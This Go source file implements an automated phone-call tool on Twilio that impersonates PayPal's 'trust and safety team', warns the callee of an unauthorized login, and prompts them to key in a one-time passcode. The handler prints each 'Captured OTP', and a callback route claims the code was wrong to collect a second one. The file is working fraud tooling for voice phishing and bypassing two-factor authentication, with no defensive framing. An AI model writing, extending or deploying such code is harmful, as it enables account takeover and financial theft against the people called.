package twillio

import (
	"fmt"
	"github.com/flyandi/twiml"
	"github.com/gin-gonic/gin"
	"github.com/sfreiberg/gotwilio"
	"net/http"
	"strings"
)

var (
	Response InitiateCallResponse
	Scripts  = map[string]string{
		"paypal": "Hello [name], this is PayPal's automated trust and safety team and we have noticed an unauthorized login on your account. If this was not you, dial one. If this was you, dial two.",
	}
)

func New(AccountSid string, AuthToken string, TwillioPhoneNumber string, NgrokUrl string) *Twillio {
	return &Twillio{
		AccountSID:         AccountSid,
		AuthToken:          AuthToken,
		TwillioPhoneNumber: TwillioPhoneNumber,
		NgrokUrl:           NgrokUrl,
	}
}

func (t *Twillio) CheckSid(context *gin.Context) {
	var Response SidResponse

	if err := context.ShouldBindJSON(&Response); err != nil {
		context.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	Client := gotwilio.NewTwilioClient(t.AccountSID, t.AuthToken)
	call, _, err := Client.GetCall(Response.Sid)
	if err != nil {
		context.JSON(http.StatusInternalServerError, gin.H{
			"error": err.Error(),
		})
		return
	}

	context.JSON(http.StatusOK, gin.H{
		"Status": call.Status,
	})
}

func (t *Twillio) InitiateCall(context *gin.Context) {
	if err := context.ShouldBindJSON(&Response); err != nil {
		context.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	Client := gotwilio.NewTwilioClient(t.AccountSID, t.AuthToken)
	CallbackParams := gotwilio.NewCallbackParameters(t.NgrokUrl + "/ask-question")

	resp, exception, err := Client.CallWithUrlCallbacks(t.TwillioPhoneNumber, Response.RecipientNumber, CallbackParams)
	if err != nil {
		context.JSON(http.StatusInternalServerError, gin.H{
			"error": err.Error(),
		})
		return
	}

	if exception != nil {
		context.JSON(http.StatusInternalServerError, gin.H{
			"exception": exception.Message,
		})
		return
	}

	context.JSON(http.StatusOK, gin.H{
		"CallSID": resp.Sid,
	})
}

func (t *Twillio) CallBack(context *gin.Context) {
	if err := context.ShouldBindJSON(&Response); err != nil {
		context.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	Client := gotwilio.NewTwilioClient(t.AccountSID, t.AuthToken)
	CallbackParams := gotwilio.NewCallbackParameters(t.NgrokUrl + "/ask-otp?callback=true")

	resp, exception, err := Client.CallWithUrlCallbacks("+15739953565", Response.RecipientNumber, CallbackParams)
	if err != nil {
		context.JSON(http.StatusInternalServerError, gin.H{
			"error": err.Error(),
		})
		return
	}

	if exception != nil {
		context.JSON(http.StatusInternalServerError, gin.H{
			"exception": exception.Message,
		})
		return
	}

	context.JSON(http.StatusOK, gin.H{
		"CallSID": resp.Sid,
	})
}

func (t *Twillio) AskQuestion(context *gin.Context) {
	res := twiml.NewResponse()

	FinalQuestion := strings.Replace(Scripts[strings.ToLower(Response.Service)], "[name]", Response.TargetName, 1)

	pause := &twiml.Pause{
		Length: 2,
	}

	gather := &twiml.Gather{
		Action:    t.NgrokUrl + "/ask-otp", // Specify the URL to handle the user's input
		Method:    "POST",                  // Use the POST method to send the input to the server
		NumDigits: 1,                       // Collect x digits
		Timeout:   15,                      // Allow 15 seconds for input
		Input:     "dtmf speech",           // Allow input via DTMF (phone keypad) and speech
	}

	say := &twiml.Say{
		Text:  FinalQuestion,
		Voice: twiml.Woman,
	}

	res.Add(pause, say, gather)

	xmlBytes, err := res.Encode()
	if err != nil {
		fmt.Errorf("AskQuestion: %v", err)
	}

	context.Header("Content-Type", "application/xml")
	context.String(http.StatusOK, string(xmlBytes))
}

func (t *Twillio) AskOTP(context *gin.Context) {
	var Message string

	if context.DefaultQuery("callback", "false") == "true" {
		Message = fmt.Sprintf("Hello %v, you have entered the wrong one time passcode. We have sent you a new %d digit code, please dial it followed by the pound key.", Response.TargetName, Response.LenDigits)
	} else {
		Message = fmt.Sprintf("We have sent you a %d digit code, please dial it followed by the pound key.", Response.LenDigits)
	}

	res := twiml.NewResponse()

	res.Add(
		&twiml.Pause{
			Length: 2,
		}, &twiml.Say{
			Text:  Message,
			Voice: twiml.Woman,
		}, &twiml.Gather{
			Action:      t.NgrokUrl + "/handle-input", // Specify the URL to handle the user's input
			Method:      "POST",                       // Use the POST method to send the input to the server
			FinishOnKey: "#",                          // User can press "#" to finish input
			Timeout:     60,                           // Allow 60 seconds for input
			Input:       "dtmf speech",
			//NumDigits: Response.LenDigits,           // Collect x digits (optional)
		})

	xmlBytes, err := res.Encode()
	if err != nil {
		fmt.Errorf("AskOTP: %v", err)
	}

	context.Header("Content-Type", "application/xml")
	context.String(http.StatusOK, string(xmlBytes))
}

func (t *Twillio) HandleInput(context *gin.Context) {
	digits := context.PostForm("Digits")
	res := twiml.NewResponse()

	if len(digits) == 0 {
		fmt.Println("Status -> Recipient did not enter OTP.")
	} else {
		fmt.Println("Status -> Captured OTP: " + digits)
	}

	res.Add(
		&twiml.Say{
			Text:  "Please hold while we authenticate you.",
			Voice: twiml.Woman,
		}, &twiml.Play{
			URL: "https://ia904701.us.archive.org/33/items/music_20221124/music.mp3",
		}, &twiml.Say{
			Text:  fmt.Sprintf("Thank you %v, if any issues persist, we will call you back! Have a nice day.", Response.TargetName),
			Voice: twiml.Woman,
		},
	)

	xmlBytes, err := res.Encode()
	if err != nil {
		fmt.Errorf("AskOTP: %v", err)
	}

	context.Header("Content-Type", "application/xml")
	context.String(http.StatusOK, string(xmlBytes))
}
